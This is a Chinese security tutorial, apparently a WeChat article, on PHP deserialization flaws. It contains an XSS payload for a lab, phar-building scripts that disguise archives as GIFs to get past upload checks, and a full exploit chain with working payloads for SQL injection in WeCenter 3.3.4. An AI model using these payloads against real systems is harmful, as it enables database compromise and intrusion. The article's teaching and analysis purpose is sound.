> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3NCSKyzsSAgtAoixdSNbpw)

**序列化**

搞懂反序列化漏洞的前提, 先搞懂什么是序列化:

序列化说通俗点就是把一个对象变成可以传输的字符串。

序列化实际是为了传输的方便, 以整个对象为单位进行传输, 而序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。如果了解底层的同学可以知道, 类中的方法本就不在类中。

而在 php 中, 使用函数 serialize() 来返回一个包含字节流的字符串来表示

比如:

class S{

public $test="sd";

}

$s=new S(); // 创建一个对象

serialize($s); // 把这个对象进行序列化

序列化的结果是:

O:1:"S":1:{s:4:"test";s:2:"sd";}

代表的含义依次是:

*   O: 代表 object
    
*   1: 代表对象名字长度为一个字符
    
*   S: 对象的名称
    
*   1: 代表对象里面有一个变量
    
*   s: 数据类型 (string)
    
*   4: 变量名称的长度
    
*   test: 变量名称
    
*   s: 数据类型
    
*   2: 变量值的长度
    
*   sd: 变量值
    

顺便说一下 PHP 对不同类型的数据用不同的字母进行标示

*   a - array
    
*   b - boolean
    
*   d - double
    
*   i - integer
    
*   o - common object
    
*   r - reference
    
*   s - string
    
*   C - custom object
    
*   O - class
    
*   N - null
    
*   R - pointer reference
    
*   U - unicode string
    

**反序列化**

就是把被序列化的字符串还原为对象, 然后在接下来的代码中继续使用。

使用 unserialize() 函数

$u=unserialize("O:1:"S":1:{s:4:"test";s:2:"sd";}");

echo $u->test; // 得到的结果为 sd

**反序列化安全**

**序列化和反序列化本身没有问题**, 但是如果反序列化的内容是用户可以控制的, 且后台不正当的使用了 PHP 中的魔法函数, 就会导致安全问题

有哪些 php 常见的魔法函数:

*   __construct() 当一个对象创建时被调用
    
*   __destruct() 当一个对象销毁前被调用
    
*   __sleep() 在对象被序列化前被调用
    
*   __wakeup 将在反序列化之后立即被调用
    
*   __toString 当一个对象被当做字符串使用时被调用
    
*   __get(),__set() 当调用或设置一个类及其父类方法中未定义的属性时
    
*   __invoke() 调用函数的方式调用一个对象时的回应方法
    
*   __call 和 __callStatic 前者是调用类不存在的方法时执行，而后者是调用类不存在的静态方式方法时执行。
    

有面向对象编程基础的同学应该很多都能看懂, 比如__contruct()：c++ 中的构造函数, java 中的构造器；__destruct()：c++ 中的析构函数. java 的自动回收机制: finalize()

**靶场实战**

了解了序列化、反序列化、php 魔法函数, 先来看一个靶场, 尝试反序列化构造 payload

**payload**

看一下题目, 已知反序列化入口

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRazhwpHne4QL6bdOGlGssDDksorfIT4bWA06w2m34icZiaGel0Jj3IWEfw/640?wx_fmt=png)

先随便输点东西看看

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaM9icHCeM2Cqx4bcXVtwXdj0cic0UYDQh9ABb5icibEmeqTBaI5PVNm6g3A/640?wx_fmt=png)

这里既然是反序列化接口, 就需要输入我们序列化的字符串, 比如插入我们刚刚的 payload

O:1:"S":1:{s:4:"test";s:2:"sd";}

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRa80mnlx5ggYtrX37Rnm2EpPK27RZr9tl1cph9Riaa2MyyAY7p2ib79hRA/640?wx_fmt=png)

不仅于此, 构造 xss

```
O:1:"S":1:{s:4:"test";s:28:"<script>alert('sd')</script>";}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaHWfMoiaBehyJITHiaNAyMiaZjRld9FPr0m3Ivuu0riarniaS0aHNupIdqHA/640?wx_fmt=png)

**漏洞原理分析**

先看源码

```
<?php
$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);


if ($SELF_PAGE = "unser.php"){
$ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
}


$PIKA_ROOT_DIR =  "../../";
include_once $PIKA_ROOT_DIR.'header.php';


class S{
var $test = "pikachu";
function __construct(){
echo $this->test;
}
}
$html='';
if(isset($_POST['o'])){
$s = $_POST['o'];
if(!@$unser = unserialize($s)){
$html.="<p>大兄弟,来点劲爆点儿的!</p>";
}else{
$html.="<p>{$unser->test}</p>";
}
}
?>
```

**漏洞成因:**

**一. 参数可控**

从源码可以看到反序列化的变量是 post 请求的, post 请求变量名为 o, 通过抓包发现我们输入框输入的值, 正好赋值给 Post 变量 o

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaB0wfkloacdduIOEqXtHoL1vUNZ7wl2kdmHasteLr4IB3LmROPGNmhg/640?wx_fmt=png)

**二. 实现了 unserialize() 函数**

这一点是肯定的, 没有这个函数这里肯定就无法反序列化

**三. 调用了魔法函数**

__construct 函数可利用

**四. 没有过滤**

没有对传参进行过滤，否则无法构成目的 Payload。

实战中要更具情况来构造 payload, 能利用的漏洞也远不止 xss

**phar:// 伪协议**

除了 unserialize 反序列化之外 ，另一种能够反序列化方式是利用 phar:// 协议触发反序列化, 前提是完全可控的文件名。

这个方法是在 BlackHat 大会上的 Sam Thomas 分享了 File Operation Induced Unserialization via the “phar://” Stream Wrapper ，该研究员指出**该方法在文件系统函数 （ file_get_contents 、 unlink 等）参数可控的情况下，配合 phar:// 伪协议 ，可以不依赖反序列化函数 unserialize() 直接进行反序列化的操作**。

**什么是 phar**

官方文档:

https://www.php.net/manual/zh/book.phar.php

简单来说，phar 是 PHP 提供的一种压缩和归档的方案，并且还提供了各种处理它的方法。

**phar 结构**

由四部分组成:

**一: stub**

即用来标识 phar 文件的部分，类似 MZ 头。格式为

```
<?php
Phar::mapPhar();
include 'phar://phar.phar/index.php';
__HALT_COMPILER();
?>
```

**二: manifest describing the contents**

phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分，也存储用户自定义的 meta-data，这是用来攻击的入口，最核心的地方

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaGzvhmpPZxs24H6d1Q7MSWgGXXHia1RVjwQYlpTpIGcp5ibrphrRialiaTw/640?wx_fmt=png)

**三: the file contents**

被压缩文件的内容

**四**:**signature for verifying Phar integrity**

可选项，即签名。

**demo**

根据 phar 文件结构我们来自己构建一个 phar 文件，php 内置了一个 Phar 类来处理相关操作。

**注意：要将 php.ini 中的 phar.readonly 选项设置为 Off，否则无法生成 phar 文件。不要只读**

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaENkTac2iaYdn7cKzsJpknmx31TtVRQhDHRWYpTxu3HfOUnzFZFZ3gfQ/640?wx_fmt=png)

如果修改了之后在 phpinfo 上还是 On 的话记得把这行最前面的分号删掉, 这样就行了

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaS6ZBkWysy1DVtEZZ7kb3qeI9JhvhYHVUtBPnxajWaDjftanuR4RibMQ/640?wx_fmt=png)

```
<?php
class TestObject {
}
@unlink("1.phar");
$phar = new Phar("1.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new TestObject();
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

访问该 php 页面, 会在文件当前目录下生成一个 phar 文件  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaRvicRI7uO02yc16ACTtmkNUvXfcqVIL3h1F3DMqDsgbpMC9e1y1ukHQ/640?wx_fmt=png)很明显的序列化特征，TestObject 这个类已经以序列化形式储存

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRak2FL8osO6LnmSOaT9ZqA3H7LRqVVTS6k2fw3oiaP7LWpFIRSNuZuibbQ/640?wx_fmt=png)

有序列化, 必然有反序列化来处理,**php 一大部分的文件系统函数在通过 phar:// 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化**，测试后受影响的函数如下：  

```
fileatime    filectime        filemtime    file_exists    file_get_contents    file_put_contents


file         filegroup        fopen        fileinode      fileowner            fileperms


is_dir       is_file          is_link      is_executable  is_readable          is_writeable


is_wirtble   parse_ini_file   copy         unlink         stat                 readfile
```

**将 phar 文件伪装为 gif**

phar 在设计时, 只要求前缀为__HALT_COMPILER(); 而后缀或者内容并未设限, 可以构造文件绕过上传

```
<?php
class TestObject {
}

@unlink("sd.phar");
$phar = new Phar("sd.phar");
$phar->startBuffering();
$phar->setStub("GIF89a","<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
$o = new TestObject();
$o->data='sd!';
$phar->setMetadata($o); //将自定义meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaCovlIbkfrcqLs7HVUPibhKnlPCfV4AuKcW13ibJ8urNfhJSZ9bxWOV2A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaHtjp3ffgdGYvGsb3Qb2yMlvJV0Xpnu8ibuGBBYAWtVP0rR1qKvH4MTQ/640?wx_fmt=png)

```
<?php
include('phar://sd.gif');
class TestObject {
    function __destruct()
{
        echo $this->data;
    }
}
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaDY26fa3qTL8S8YTYXs47hTHBqQiaxSKpcduXTOknLTvhHLsCQLEZUxA/640?wx_fmt=png)

成功将 meta-data 中 data 数据反序列化出来

**总结**

利用条件:

1.  phar 文件要能够上传到服务器端。
    
2.  要有可用的魔术方法作为 “跳板”。
    
3.  文件操作函数的参数可控，且:、/、phar 等特殊字符没有被过滤。
    

**WeCenter3.3.4 反序列化造成 sql 注入**

**这个洞有点老了, 但不影响学习分析**

cms 下载地址:

http://www.wecenter.com/downloads/

在这个版本的 cms 中存在多个反序列化 POP 链，如果我们想利用这些 POP 链，就必须找到可控的反序列化点。WeCenter 中就存在可控的文件名, 能够利用 phar 伪协议

 定位到漏洞文件**./system/aws_model.inc.php**

**![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaE4NBDfiaMsUSsYKia1ykefnobA0jtrmbfFcbicPPRpwqXcVicg20ohJPwg/640?wx_fmt=png)**

 析构函数遍历了 **$this->_shutdown_query** 变量，然后带入了 **$this->query()** 函数，跟一下

```
public function query($sql, $limit = null, $offset = null, $where = null)
{
$this->slave();


if (!$sql)
{
throw new Exception('Query was empty.');
}


if ($where)
{
$sql .= ' WHERE ' . $where;
}


if ($limit)
{
$sql .= ' LIMIT ' . $limit;
}


if ($offset)
{
$sql .= ' OFFSET ' . $offset;
}


if (AWS_APP::config()->get('system')->debug)
{
$start_time = microtime(TRUE);
}


try {
$result = $this->db()->query($sql);
} catch (Exception $e) {
show_error("Database error\n------\n\nSQL: {$sql}\n\nError Message: " . $e->getMessage(), $e->getMessage());
}


if (AWS_APP::config()->get('system')->debug)
{
AWS_APP::debug_log('database', (microtime(TRUE) - $start_time), $sql);
}


return $result;
}
```

并没有任何的过滤, 如果 **$this->_shutdown_query** 变量参数可控, 那么就可以造成 sql 注入  

利用反序列化的方式，可以重置 **$this->_shutdown_query** 的值。

再看**./models/account.php**

```
public function associate_remote_avatar($uid, $headimgurl)
{
if (!$headimgurl)
{
return false;
}


if (!$user_info = $this->get_user_info_by_uid($uid))
{
return false;
}


if ($user_info['avatar_file'])
{
return false;
}


if (!$avatar_stream = file_get_contents($headimgurl))
{
return false;
}


$avatar_location = get_setting('upload_dir') . '/avatar/' . $this->get_avatar($uid, '');


$avatar_dir = dirname($avatar_location) . '/';
if (!file_exists($avatar_dir))
{
make_dir($avatar_dir);
}
```

**associate_remote_avatar** 函数将传进来的 **$headimgurl** 没有经过任何过滤直接传入了文件操作函数 **file_get_contents** 中，这个系统函数正好就在受影响的范围之内。全局搜索 **associate_remote_avatar**  

在**./app/account/ajax.php**

**![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRam5S3WKa4Z2wIWwRicF9e2Nbg1k2bbv1a5DXKlMhnENXK7sHv4pryL3w/640?wx_fmt=png)**

这个函数调用了 **associate_remote_avatar,** 而 **$headimgurl** 值来源于 **$wxuser['headimgurl']**，这个 $wxuser 实际上是数据库 **users_weixin** 表中的相关数据，如果有 insert,update 就好了  

在**./models/openid/weixin/weixin.php**

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRadEnJ9lql4f3yiaoQUySQTjPCmEo7LDmSydzX6FXVicD0hrktS0tgBP8Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRadibCSqquVIz4Lcaz1zzxk4XJbORcIop7hALvaKruKVYgibxgCZINEWvA/640?wx_fmt=png)

找到了数据库 **users_weixin** 表,**headimgurl** 对应 **$access_user['headimgurl']**，并且 **$access_user** 为函数被调用时传入的参数，继续找哪里调用了 **bind_account** 方法

在**./app/m/weixin.php**

**![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRa17nE4VB8bXxw91cD9N7PqnsgYiaQsFC7KnmCFcRhWaCfYia6F51QbR4w/640?wx_fmt=png)**

$WXConnect 的值来源于 COOKIE，而 **$access_user** 来源于 **$WXConnect['access_user']**，而 cookile 是可控的,**file_get_contents** 有了完全可控的参数, 我们就可以利用 phar:// 协议触发反序列化

**漏洞利用**

注册一个账号

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaHh38FhUqC7AQLAOQxGkQoDDATXAaUIkSibqLJDPhNR3dr4hM9xVFvxw/640?wx_fmt=png)

选择发起一个问题, 并上传一个图片

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaR0iaqtEt8HEr4jj4T4zF2BB6vOhJFt4YMWibcLiapCNpRGrXDHgUyMq9g/640?wx_fmt=png)

上传一个 phar 文件, 但改后缀为 gif

```
<?php
class AWS_MODEL{
private $_shutdown_query = array();


public function __construct(){
$this->_shutdown_query['test'] = "SELECT UPDATEXML(1, concat(0xa, user(), 0xa), 1)";
}
}
$a = new AWS_MODEL;
$phar = new Phar("11.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."__HALT_COMPILER();");
$phar->setMetadata($a);
$phar->addFromString("test.txt","123");
$phar->stopBuffering();
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRagwPIYJPLyaXUnYbgnx9YUia1KlcuLNDHrrpTUIr4cMyA25icYaTb7WHw/640?wx_fmt=png)

上传到服务器

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaf9Q7t3rYS2m36UDLTKnuRCDKiciaHmja1HYmsT5fyousl0o5hia7Yiczzw/640?wx_fmt=png)

 这里会返回绝对路径

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaEHITiadCwbxz3hPvWPrgCtmkgM8jvR0jMxxibKibtznspBeC62Nx8ho1w/640?wx_fmt=png)

编造 payload

```
<?php
$arr = array();
$arr['access_token'] = array('openid' => '1');
$arr['access_user'] = array();
$arr['access_user']['openid'] = 1;
$arr['access_user']['nickname'] = 'admin';
$arr['access_user']['headimgurl'] = 'phar://uploads/question/20210606/ca6820646810c27e025258594bb905ea.gif';
echo json_encode($arr);
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRanZhun7cuRCrbzialX9NFJaTRspUjmWGMVJyp0vkOvfh1Kx1pprvuQ7w/640?wx_fmt=png)

带入 cookie, 并访问 app/m/weixin.php 下的 binding_action, 显示 "绑定微信成功"  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaFeajQjnLeXkRwQ3elib2P6cpurO3LviaMfKEVvEVGa9g8SkOmV9jjozA/640?wx_fmt=png)

最后访问 app/account/ajax.php 下的 synch_img_action, 注入成功  

**![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaujiaZ3OWacUuyzun9bnaKfFsKvam3Sib6ibZQVjQCt6UMicf0g8m4wT4Jw/640?wx_fmt=png)**

**参考**

WeCenter3.3.4 前台 SQL 注入 & 任意文件删除 & RCE

某 Center v3.3.4 从前台反序列化任意 SQL 语句执行到前台 RCE

利用 phar 拓展 php 反序列化漏洞攻击面

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读：**

本月报名可以参加抽奖送暗夜精灵 6Pro 笔记本电脑的优惠活动

[![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibHHibNbEpsAMia19jkGuuz9tTIfiauo7fjdWicOTGhPibiat3Kt90m1icJc9VoX8KbdFsB6plzmBCTjGDibQ/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247496998&idx=1&sn=da047300e19463fc88fcd3e76fda4203&chksm=ec1ca019db6b290f06c736843c2713464a65e6b6dbeac9699abf0b0a34d5ef442de4654d8308&scene=21#wechat_redirect)

**点赞，转发，在看**

投稿作者：Buffer

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)